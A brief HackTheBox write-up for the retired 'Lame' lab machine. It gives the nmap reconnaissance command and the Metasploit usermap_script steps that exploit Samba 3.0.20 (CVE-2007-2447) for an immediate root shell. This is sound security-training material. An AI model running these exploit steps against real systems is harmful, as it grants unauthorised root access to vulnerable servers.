---
title: Lame
description: HackTheBox Lame machine writeup
---

> **Difficulty:** Easy · **OS:** Linux · **Status:** Retired ✅

## 📋 Summary

Lame exploits the **Samba 3.0.20** vulnerability (`CVE-2007-2447`) to get RCE as root.

## 🔍 Recon

```bash
nmap -sC -sV 10.10.10.3
```

We detect Samba 3.0.20-Debian → vulnerable to CVE-2007-2447.

## 💥 Exploitation

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
run
```

Direct shell as **root**. No privilege escalation needed.

## 🚩 Flags

- `user.txt` → `/home/makis/`
- `root.txt` → `/root/`
